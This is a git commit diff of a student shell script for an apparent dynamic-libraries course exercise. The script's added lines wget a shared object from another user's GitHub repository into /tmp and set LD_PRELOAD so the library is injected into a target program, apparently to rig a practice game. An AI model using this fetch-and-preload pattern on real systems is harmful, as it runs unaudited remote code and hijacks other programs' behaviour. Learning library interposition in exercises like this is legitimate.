7081fcce35556455c037bf17a07a315269a1c02c
Nyptech <nspatrickie@gmail.com>
2024-06-28 20:47:57 -0700

    new

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P
-export LD_PRELOAD=../libhack.so
+wget -P /tmp/ https://raw.github.com/betascribbles/alx-low_level_programming/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
